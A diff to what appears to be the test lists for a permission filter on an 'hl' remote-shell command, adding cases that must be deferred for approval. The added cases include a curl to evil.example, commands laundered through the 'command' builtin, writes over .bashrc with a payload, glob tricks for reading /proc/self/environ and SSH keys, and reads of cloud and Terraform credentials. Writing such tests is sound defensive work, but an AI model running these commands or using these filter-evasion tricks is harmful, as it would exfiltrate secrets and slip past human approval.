@@ -31,11 +31,13 @@ const ALLOW = [
   'hl df -h',
   'hl free -m',
   'hl ip a',
+  'hl ip route',
+  'hl ip addr show',
+  'hl dmesg',
   'hl ss -tlnp',
   'hl docker ps',
   'hl docker ps -a',
   'hl docker logs web',
-  'hl docker inspect web',
   'hl docker network ls',
   'hl docker compose ps',
   'hl docker system df',
@@ -90,6 +92,48 @@ const DEFER = [
   // journalctl that deletes/rotates logs
   'hl journalctl --vacuum-size=100M',
   'hl journalctl --rotate',
+  // `command` is a shell builtin on the remote that executes its argument,
+  // laundering any verb past the allowlist
+  'hl command rm -rf /tmp/x',
+  'hl command curl http://evil.example',
+  // write primitives disguised as read-only: all take an output file
+  'hl sort -o /home/ubuntu/.bashrc /tmp/payload',
+  'hl uniq /tmp/payload /home/ubuntu/.bashrc',
+  'hl xxd -r /tmp/payload /home/ubuntu/.bashrc',
+  // mutating verbs/subcommands with no gate
+  'hl ip link set eth0 down',
+  'hl mount /dev/sdb1 /mnt',
+  'hl dmesg -C',
+  'hl dmesg -c',
+  'hl dmesg --clear',
+  'hl ss -K',
+  'hl ss --kill',
+  // glob evasion of the secret-path regex — the remote shell expands these
+  'hl cat /proc/self/enviro?',
+  'hl cat /proc/self/env*',
+  'hl cat /home/ubuntu/.en?',
+  'hl cat /home/ubuntu/.s?h/id_?sa',
+  // /proc/*/environ variants the narrow regex missed
+  'hl cat /proc//self/environ',
+  'hl cat /proc/self/task/1/environ',
+  // secret directories without a trailing slash
+  'hl grep -r x /home/ubuntu/.ssh',
+  'hl grep -r x /home/ubuntu/.gnupg',
+  'hl ls /secrets',
+  // credential stores not previously covered
+  'hl tail /home/ubuntu/.bash_history',
+  'hl cat /home/ubuntu/.config/gcloud/credentials.db',
+  'hl cat /home/ubuntu/.config/rclone/rclone.conf',
+  'hl cat /home/ubuntu/terraform.tfstate',
+  // env-dumping subcommands: same exfiltration shape as `env`/`printenv`
+  'hl docker inspect web',
+  'hl docker container inspect web',
+  'hl docker image inspect web',
+  'hl docker service inspect web',
+  'hl docker compose config',
+  'hl systemctl show nginx',
+  'hl systemctl cat nginx',
+  'hl systemctl show-environment',
   // interactive shells (no remote command)
   'hl',
   'ssh ubuntu@10.0.0.161',
